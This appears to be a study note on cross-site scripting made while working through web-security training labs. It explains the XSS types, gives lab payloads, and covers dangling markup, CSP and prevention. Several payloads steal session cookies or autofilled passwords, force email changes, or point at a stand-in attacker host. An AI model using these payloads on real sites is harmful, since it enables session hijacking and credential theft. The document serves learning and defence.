Injection of custom scripts (usually HTML or Javascript) on a victim’s browser due to improper validation and escaping.

## Types of XSS

- **Reflected XSS**: the malicious script comes from the current request and its effects are reflected in the response.
- **Stored XSS**: more dangerous. The malicious script is  *stored* in the database. All users of the insecure website are potentially affected by the injection (they all could fetch the malicios script from the database). Attackers wait for the victim to activate the malicious script (by fetching it).
	- **Blind XSS**: stored XSS executed in another part of the application or in another application that you cannot see (like second-order SQL injection). For example, malicious script sent via feedback forms and executed by the administrator in the dashboard.
- **DOM XSS**: the vulnerability exists in client-side code (not in server-side code). Frontend Javascript code interprets untrusted input as code.

##### Difference between Reflected and Stored XSS

- The key difference between reflected and stored XSS is that a stored XSS vulnerability enables attacks that are self-contained within the application itself. The attacker does not need to find an external way of inducing other users to make a particular request containing their exploit. Rather, the attacker places their exploit into the application itself and simply waits for users to encounter it. For the reflected XSS instead, the attacker should inject itself to check if there's XSS vulnerability and then *send a link* to the victim to execute the attack also to its browser. 

## Proof of Concept

- Suppose a website has a search function which receives the user-supplied search term in a URL parameter: 

```http
https://insecure-website.com/search?term=gift
```

The application echoes the supplied search term in the response to this URL: 

```html
<p>You searched for: gift</p>
```

Assuming the application doesn't perform any validation on the data, an attacker can construct an attack like this:

```html
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```

This URL results in the following response:

```html
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser.

## Labs

- ##### Lab: Reflected XSS into HTML context with nothing encoded
- ##### Lab: Stored XSS into HTML context with nothing encoded

```html
<script>alert(1)</script>
```

- ##### Lab: DOM XSS in `document.write` sink using source `location.search`

```html
"><svg onload=alert(1)>
```

- ##### Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

```html
product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

- ##### Lab: DOM XSS in `innerHTML` sink using source `location.search`

```html
<img src=1 onerror=alert(1)>
```


- ##### Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

```javascript
javascript:alert(document.cookie)
```

- ##### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

```javascript
{{$on.constructor('alert(1)')()}}
```

- ##### Lab: Reflected XSS with some SVG markup allowed

```http
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```

which URL-decoded corresponds to:

```html
https://YOUR-LAB-ID.web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>
```

- ##### Lab: Reflected XSS into attribute with angle brackets HTML-encoded

```javascript
"onmouseover="alert(1)
```

- ##### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
	
	Some useful ways of breaking out of a string literal are:
	
```javascript
'-alert(document.domain)-' 
';alert(document.domain)//
```

- ##### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

```html 
</script><script>alert(1)</script>
```

- ##### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

```javascript
${alert(1)}
```


- ##### Lab: Exploiting cross-site scripting to steal cookies

```html
<script>  
window.onload = () => {
const csrf = document.getElementsByTagName('form')[0].getElementsByTagName('input')[0].value;

fetch('https://0a9900d5042125be80f9ccc7009a0036.web-security-academy.net/post/comment', {
    method: 'POST',
    body: `csrf=${csrf}&postId=4&comment=${document.cookie}&name=foo&email=foo@example.com&website=`,  
    });  
}  
</script>
```


- ##### Lab: Exploiting cross-site scripting to capture passwords

```html
<input name="username" id="username">  
<input type="password" name="password" id="password">

<script>  
// it may work also with window.onload, but I opted for 1s delay to let the password manager fill in the username and password fields  
setTimeout(() => {  
    const csrf = document.getElementsByTagName('form')[0].getElementsByTagName('input')[0].value;  
    const username = document.getElementById('username').value;  
    const password = document.getElementById('password').value;

    fetch('https://0aec008b0337db878095a879004b00e7.web-security-academy.net/post/comment', {
    method: 'POST',
    body: `csrf=${csrf}&postId=5&comment=${username}:${password}&name=foo&email=foo@example.com&website=`,  
    });  
}, 1000);  
</script>
```


- ##### Lab: Exploiting XSS to perform CSRF

```html
<script>  
window.onload = () => {
const csrf = document.getElementsByTagName('form')[0].getElementsByTagName('input')[0].value;

fetch('https://0a5800bf03ee84cb81b68e7a002900d8.web-security-academy.net/my-account/change-email', {
method: 'POST',
body: `csrf=${csrf}&email=foobar@example.com`,
});  
}  
</script>
```

Or:

```html
<script>
var req = new XMLHttpRequest(); // crea una request
req.onload = handleResponse; // gestisce la response
req.open('get','/my-account',true);
req.send();

function handleResponse() {
// prende il valore del token ‘csrf’ della risposta HTTP in questione e lo salva nella variabile token: nota che la risposta viene inviata da chi visualizza la pagina dei commenti
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
// crea una nuova HTTP request
var changeReq = new XMLHttpRequest();

// istanzia la request come POST verso l’endpoint
changeReq.open('post', '/my-account/change-email', true);
// invia la POST request all’endpoint di cui sopra con il token csrf preso prima
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

## Dangling markup injection

Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.
Suppose an application embeds attacker-controllable data into its responses in an unsafe way:

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE">
```

Suppose also that the application does not filter or escape the `>` or `"` characters. An attacker can break out of the quoted attribute value and the enclosing tag:

```html
">
```

In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:

```html
"><img src='//attacker-website.com?
```

Note that the attacker's payload doesn't close the `src` attribute, which is left *dangling*. When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute.

The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data.

## Content Security Policy (CSP)

CSP is a browser security mechanism that works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.

To enable CSP, a response needs to include an HTTP response header called `Content-Security-Policy` with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.

The following directive will only allow scripts to be loaded from the same origin as the page itself:

`script-src 'self'`

The following directive will only allow scripts to be loaded from a specific domain:

`script-src https://scripts.normal-website.com`

- A good starting point to define a Content Security Policy:

`default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';`

## Prevention

- Validate input on arrival:
	- If a user submits a URL that will be returned in responses, validate that it starts with a safe protocol such as HTTP and HTTPS.
	- If a user supplies a value that is expected to be numeric, validate that the value actually contains an integer.
	- Validate that input contains only an expected set of characters.
	- **Whitelisting**.

- Not sanitize too much!
	Example: If you drop `<script>` substrings, I will send `<s<script>cript>`
- Escape (or encode) output:
	In an HTML context, you should convert non-whitelisted values into HTML entities:
	- `<` converts to: `&lt;`
	- `>` converts to: `&gt;`
	In a JavaScript string context, non-alphanumeric values should be Unicode-escaped:
	- `<` converts to: `\u003c`
	- `>` converts to: `\u003e`

- Use well established libraries and frameworks (like Svelte, Angular, Node.js ecc.)

- Flag as *HttpOnly* (prevents cookies from being accessed by JavaScript, that is `document.cookie` cannot return the cookie) all cookies that are not expected to be accessible from JavaScript (session cookies for sure)

- Restrict what can be loaded by setting a Content Security Policy (powerful, but not simple)